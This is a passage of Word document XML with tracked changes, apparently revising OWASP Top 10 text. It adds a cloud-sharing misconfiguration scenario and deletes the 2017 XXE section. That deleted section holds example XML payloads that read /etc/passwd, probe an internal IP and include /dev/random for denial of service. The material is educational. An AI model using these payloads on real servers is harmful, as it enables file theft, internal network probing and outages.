            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0176201F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>component versions that are known to be vulnerable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBAEE53" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D55AE4F" w14:textId="1390CB78" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2033" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>**Scenario #4</w:t>
      </w:r>
      <w:del w:id="2034" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>**:</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2035" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>:**</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A cloud service provider </w:t>
      </w:r>
      <w:ins w:id="2036" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">(CSP) </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>has default sharing</w:t>
      </w:r>
      <w:del w:id="2037" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1B0CEEF8" w14:textId="34DA6C1F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2038" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>permissions open to the Internet by other CSP users. This allows</w:t>
      </w:r>
      <w:del w:id="2039" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5A386F37" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sensitive data stored within cloud storage to be accessed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A72BD93"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40" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5EDF81D9" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="003E073E" w:rsidRDefault="005C43E9" w:rsidP="0024421C">
      <w:pPr>
        <w:pStyle w:val="HTMLVorformatiert"/>
        <w:rPr>
          <w:del w:id="2041" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2042" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A4:2017 XML External Entities (XXE)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3F854CAE"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43" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2044" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>## Example Attack Scenarios</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="77DB89CC"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45" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C42481A"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46" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2047" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>Numerous public XXE issues have been discovered, including attacking embedded devices. XXE occurs in a lot of unexpected places, including deeply nested dependencies. The easiest way is to upload a malicious XML file, if accepted:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="55D4E3FD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="2048" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFromRangeStart w:id="2049" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923172"/>
    </w:p>
    <w:p w14:paraId="711BD700" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9" w:rsidRDefault="00841D1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50" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="2051" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #</w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="2049"/>
      <w:del w:id="2052" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="005C43E9" w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>1**: The attacker attempts to extract data from the server:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5413FF1A"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53" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E2E7C10"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54" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2055" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>```</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="785A2FB3"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56" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2057" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">  &lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="36E4E794"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58" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2059" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">    &lt;!DOCTYPE foo [</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0694F4DB"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60" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2061" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">    &lt;!ELEMENT foo ANY &gt;</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1B82321A"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62" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2063" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6CC8E04A"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64" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2065" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="715176B5"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66" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2067" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>```</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="13C5F983" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="2068" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFromRangeStart w:id="2069" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923173"/>
    </w:p>
    <w:p w14:paraId="3C3B371C" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9" w:rsidRDefault="00841D1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70" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="2071" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #2</w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="2069"/>
      <w:del w:id="2072" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="005C43E9" w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>**: An attacker probes the server's private network by changing the above ENTITY line to:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="46BE0CC8"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73" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2074" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>```</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="03FD25CF"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75" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2076" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">   &lt;!ENTITY xxe SYSTEM "https://192.168.1.1/private" &gt;]&gt;</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="21A01ED0"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77" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2078" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>```</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7E8B048E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="2079" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFromRangeStart w:id="2080" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923174"/>
    </w:p>
    <w:p w14:paraId="07E0F383" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9" w:rsidRDefault="00841D1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81" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="2082" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>**Scenario #3</w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="2080"/>
      <w:del w:id="2083" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="005C43E9" w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>**: An attacker attempts a denial-of-service attack by including a potentially endless file:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5BEA909A"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84" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50BA3DA2"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85" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2086" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>```</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="13DB59F4"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87" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2088" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">   &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6116A0E8" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="003E073E"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89" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2090" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>```</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3C27D81F"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91" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="420F89FD" w14:textId="5F9AF00E" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="692D9629" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
